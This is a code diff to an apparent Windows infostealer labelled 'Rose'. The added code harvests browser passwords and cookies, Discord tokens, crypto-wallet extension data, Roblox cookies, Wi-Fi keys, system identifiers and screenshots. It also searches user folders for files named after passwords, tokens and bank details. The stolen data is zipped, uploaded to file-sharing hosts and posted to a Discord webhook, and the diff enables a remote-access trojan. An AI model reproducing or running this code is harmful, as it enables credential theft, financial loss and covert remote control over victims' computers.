@@ -5,7 +5,7 @@ import malicious
 ii = informations.Info()
 import _webhook
 _webh = _webhook.WebhookX()
-from configuration import Config 
+from config import Config 
 cc = Config()
 import rat 
 
@@ -32,9 +32,13 @@ try:
     from json import loads, dumps
     from zipfile import ZipFile
     from Crypto.Cipher import AES
+    import dhooks
+    import browser_cookie3
+    from anonFile import uploadToAnonfiles
+    from _roblox import RobloxX
 except:
     import subprocess
-    subprocess.run("python -m pip install requests && python -m pip install Pillow && python -m pip install pycryptodome && python -m pip install psutil && python -m pip install WMI && python -m pip install discord && python -m pip install dhooks", shell=True)
+    subprocess.run("python -m pip install requests && python -m pip install Pillow && python -m pip install pycryptodome && python -m pip install psutil && python -m pip install WMI && python -m pip install discord && python -m pip install dhooks && python -m pip install browser_cookie3", shell=True)
 
 if platform.system() != "Windows":
     quit()
@@ -135,7 +139,6 @@ def Trust(Cookies):
     global DETECTED
     data = str(Cookies)
     tim = re.findall(".google.com", data)
-    # print(len(tim))
     if len(tim) < 1:
         DETECTED = True
         return DETECTED
@@ -151,6 +154,33 @@ def upload(name, link):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
     }
     
+    if name == 'kiwi':
+        data = {
+            'content':'',
+            'embeds':[
+                {
+                    'color':3449140,
+                    'fields':[
+                        {
+                            'name':'Interesting files found on user PC:',
+                            'value': link
+                        }
+                    ],
+                    'author':{
+                        'name':'Rose | File stealer'
+                    },
+                    "footer": {
+                            "text": eb_footer,
+                            "icon_url": "",
+                    },
+                }
+            ],
+            'avatar_url': wh_avatar,
+            'attachments':[]
+        }
+        LoadUrlib(webhook,data=dumps(data).encode(),headers=headers)
+        return
+
 
     if name == "wpcook":
         rb = "  -  ".join(da for da in cookiWords)
@@ -284,73 +314,6 @@ def GetPasswords(path, arg):
     writeforfile(Passw, "passw")
 
 
-def RobloxCookie(path, arg):
-    return
-    global roblox_cookie
-    pathC = path + arg + "\Cookies"
-    tempfold = (
-    temp + "wp" +
-    "".join(random.choice("bcdefghijklmnopqrstuvwxyz")
-            for i in range(8)) + ".db")
-    shutil.copy2(pathC, tempfold)
-    os.remove(tempfold)
-    roblox_cookie = ""
-    with open(os.path.join(pathC, "Cookies", "RoseRobloxCookies.txt"), 'w', encoding="utf-8") as f:
-        f.write(f"{footer}\n\n")
-        with open(os.path.join(pathC, "Cookies", "RoseCookies.txt"), 'r', encoding="utf-8") as f2:
-            try:
-                for line in f2:
-                    if ".ROBLOSECURITY" in line:
-                        roblox_cookie = line.split(".ROBLOSECURITY")[1].strip()
-                        f.write(roblox_cookie + "\n")
-            except Exception:
-                roblox_cookie = "No Roblox Cookies Found :("
-        f2.close()
-    f.close()
-
-
-def UploadRobloxCookie(webhook):
-    return
-    headers = {"Cookie": ".ROBLOSECURITY=" + roblox_cookie}
-    info = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers).json()
-    data = {
-        "content":
-        "",
-        "embeds": [{
-            "color":
-            eb_color,
-            "title": f"{wh_name}  -  Roblox Cookie Grabber",
-            "fields": [
-                {
-                    "name": "<:roblox_icon:1041819334969937931> Name:",
-                    "value": f"`{info['UserName']}`",
-                },
-                {
-                    "name": "<:robux_coin:1041813572407283842> Robux:",
-                    "value": f"`{info['RobuxBalance']}`",
-                    "inline": True,
-                },
-                {
-                    "name": "🍪 Cookie:",
-                    "value": f"`{roblox_cookie}`",
-                    "inline": False,
-                },
-            ],
-            "footer": {
-                "text": eb_footer,
-                "icon_url": "",
-            },
-        }],
-        "avatar_url":
-        wh_avatar,
-        "username":
-        wh_name,
-        "attachments": [],
-    }
-    urlopen(Request(webhook, data=dumps(data).encode(), headers=headers))
-    #LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
-
-
 def GetDiscord(path, arg):
     if not os.path.exists(f"{path}/Local State"):
         return
@@ -466,9 +429,10 @@ def ZipTelegram(path, arg, procc):
             zf.write(pathC + "/" + file)
     zf.close()
 
-    # lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
-    lnik = "https://google.com"
+    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
     os.remove(f"{pathC}/{name}.zip")
+    df = dhooks.Webhook(webhook)
+    df.send(lnik)
     OtherZip.append([arg, lnik])
     
 Cookies = []    
@@ -560,13 +524,14 @@ def ZipThings(path, arg, procc):
             zf.write(pathC + "/" + file)
     zf.close()
 
-    # lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
-    lnik = "https://google.com" #Unused variable
+    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
     os.remove(f"{pathC}/{name}.zip")
-    # SEND TO WEBHOOK
-
+    
+    ef = dhooks.Webhook(webhook)
+    ef.send(lnik)
+    
+    
 def GatherAll():
-    "Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >"
     browserPaths = [
         [
             f"{roaming}/Opera Software/Opera GX Stable",
@@ -602,6 +567,14 @@ def GatherAll():
         ],
         [
             f"{local}/Google/Chrome SxS/User Data",
+            "chrome.exe",
+            "/Default/Local Storage/leveldb",
+            "/Default",
+            "/Default/Network",
+            "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
+        ],
+        [
+            f"{local}/Google/Chrome/User Data",
             "chrome.exe",
             "/Default/Local Storage/leveldb",
             "/Default",
@@ -663,41 +636,43 @@ def GatherAll():
         f"{roaming}/Telegram Desktop/tdata", "telegram.exe", "Telegram"
     ]
 
-    for patt in browserPaths:
-        a = threading.Thread(target=GetTokens, args=[patt[0], patt[2]])
-        a.start()
-        Threadlist.append(a)
-    for patt in discordPaths:
-        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
-        a.start()
-        Threadlist.append(a)
+    if cc.get_token_stealing() is True:
+        for patt in browserPaths:
+            a = threading.Thread(target=GetTokens, args=[patt[0], patt[2]])
+            a.start()
+            Threadlist.append(a)
+        
+        for patt in discordPaths:
+            a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
+            a.start()
+            Threadlist.append(a)
+            
+    if cc.get_password_stealing() is True:
+        for patt in browserPaths:
+            a = threading.Thread(target=GetPasswords, args=[patt[0], patt[3]])
+            a.start()
+            Threadlist.append(a)
 
-    for patt in browserPaths:
-        a = threading.Thread(target=GetPasswords, args=[patt[0], patt[3]])
-        a.start()
-        Threadlist.append(a)
-
-    ThCokk = []
-    for patt in browserPaths:
-        a = threading.Thread(target=GetCookies, args=[patt[0], patt[4]])
-        a.start()
-        ThCokk.append(a)
-
+    
+    if cc.get_cookie_stealing() is True:
+        for patt in browserPaths:
+            a = threading.Thread(target=GetCookies, args=[patt[0], patt[4]])
+            a.start()
+            Threadlist.append(a)
+            
     threading.Thread(target=GatherZips,
                      args=[browserPaths, PathsToZip, Telegram]).start()
-    
-    for thread in ThCokk:
-        thread.join()
+        
     DETECTED = Trust(Cookies)
-    if DETECTED == True:
+    if DETECTED is True:
         return
 
-    # for patt in browserPaths:
-    #     threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()
+    for patt in browserPaths:
+        threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()
 
-    # for patt in PathsToZip:
-    #     threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()
-
+    for patt in PathsToZip:
+        threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()
+    
     # threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()
 
     for thread in Threadlist:
@@ -705,37 +680,11 @@ def GatherAll():
     global upths
     upths = []
 
-    for file in ["wppassw.txt", "wpcook.txt"]:
-        # upload(os.getenv("TEMP") + "\\" + file)
-        upload(file.replace(".txt", ""),
-               uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))
-
-
-def uploadToAnonfiles(path):
-    try:
-        data = {
-            "password": "HENRIO"
-        }
-        rr = requests.post(
-            f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',
-            files={
-                "file": open(path, "rb")
-            },
-            data = data
-        ).json()["data"]["downloadPage"]
-        return rr
-    except:
-        return False
-
-
-# def uploadToAnonfiles(path):s
-#     try:
-#         files = { "file": (path, open(path, mode='rb')) }
-#         upload = requests.post("https://transfer.sh/", files=files)
-#         url = upload.text
-#         return url
-#     except:
-#         return False
+    if cc.get_password_stealing() is True:
+        upload("wppassw", uploadToAnonfiles(os.getenv("TEMP") + "\\wppassw.txt"))
+        
+    if cc.get_cookie_stealing() is True:
+        upload("wpcook", uploadToAnonfiles(os.getenv("TEMP") + "\\wpcook.txt"))
 
 
 def KiwiFolder(pathF, keywords):
@@ -785,9 +734,7 @@ def Kiwi():
     path2search = [
         user + "\\Desktop", user + "\\Downloads", user + "\\Documents"
     ]
-
-    key_wordsFolder = ["account", "acount", "passw", "secret"] #Unused variable
-
+    
     key_wordsFiles = [
         "passw",
         "mdp",
@@ -812,6 +759,7 @@ def Kiwi():
         "token",
         "backup",
         "secret",
+        "bank"
     ]
 
     wikith = []
@@ -877,18 +825,55 @@ GamingZip = []
 OtherZip = []
 
 GatherAll()
-# RobloxCookie(path, arg) # Fixing this shit soon
-# UploadRobloxCookie(webhook) # Fixing this shit soon
-injection.InjectionX(webhook)
-DETECTED = Trust(Cookies)
-DETECTED = False
-if not DETECTED:
-    wikith = Kiwi()
 
+    
+def send_malicious():
+    username = getpass.getuser()
+    hostname = socket.gethostname()
+    hwid = (str(subprocess.check_output("wmic csproduct get uuid"),
+                "utf-8").split("\n")[1].strip())
+    name = (str(subprocess.check_output("wmic csproduct get name"),
+                "utf-8").split("\n")[1].strip())
+
+    embed = {
+        "title":
+        f"{name}  -  System Data",
+        "description":
+        "System Information.",
+        "color":
+        eb_color,
+        "fields": [
+            {
+                "name": "User",
+                "value": f"```Host Name: {hostname}\n\nUsername: {username}```",
+                "inline": True,
+            },
+            {
+                "name": "System",
+                "value":
+                f"```OS: {platform.platform()}\n\nProcessor: {platform.processor()}\n\nHWID: {hwid}```",
+                "inline": True,
+            },
+        ],
+    }
+
+    requests.post(webhook, json={"embeds": [embed]})
+    
+    malicious.wifigr(webhook=webhook)
+
+
+screenshot = ImageGrab.grab()
+screenshot.save("screenshot.png")
+files = {"screenshot": open("screenshot.png", "rb")}
+requests.post(webhook, files=files)
+files["screenshot"].close()
+os.remove("screenshot.png")
+
+if cc.get_password_stealing() is True:
+    wikith = Kiwi()
     for thread in wikith:
         thread.join()
 
-    time.sleep(0.2)
 
     filetext = "\n"
     for arg in KiwiFiles:
@@ -903,51 +888,21 @@ if not DETECTED:
                 b = ffil[1]
                 filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
             filetext += "\n"
+            
+    print(filetext)
     upload("kiwi", filetext)
 
+if cc.get_malicious_stealing() is True:
+    send_malicious()
 
-username = getpass.getuser()
-hostname = socket.gethostname()
-hwid = (str(subprocess.check_output("wmic csproduct get uuid"),
-            "utf-8").split("\n")[1].strip())
-name = (str(subprocess.check_output("wmic csproduct get name"),
-            "utf-8").split("\n")[1].strip())
+if cc.get_injection() is True:
+    injection.InjectionX(webhook)
+    
+if cc.get_roblox_stealing() is True:
+    RobloxX.run()
 
-embed = {
-    "title":
-    f"{wh_name}  -  System Data",
-    "description":
-    "System Information.",
-    "color":
-    eb_color,
-    "fields": [
-        {
-            "name": "User",
-            "value": f"```Host Name: {hostname}\n\nUsername: {username}```",
-            "inline": True,
-        },
-        {
-            "name": "System",
-            "value":
-            f"```OS: {platform.platform()}\n\nProcessor: {platform.processor()}\n\nHWID: {hwid}```",
-            "inline": True,
-        },
-    ],
-}
-
-requests.post(webhook, json={"embeds": [embed]})
-
-
-screenshot = ImageGrab.grab()
-screenshot.save("screenshot.png")
-files = {"screenshot": open("screenshot.png", "rb")}
-requests.post(webhook, files=files)
-files["screenshot"].close()
-os.remove("screenshot.png")
-
-
-malicious.wifigr(webhook=webhook)
-_webh.locations_webhook(ii.global_info())
+if cc.get_location_stealing() is True:
+    _webh.locations_webhook(ii.global_info())
 
 if cc.get_discord_rat() is True:
     rat.run_rat()
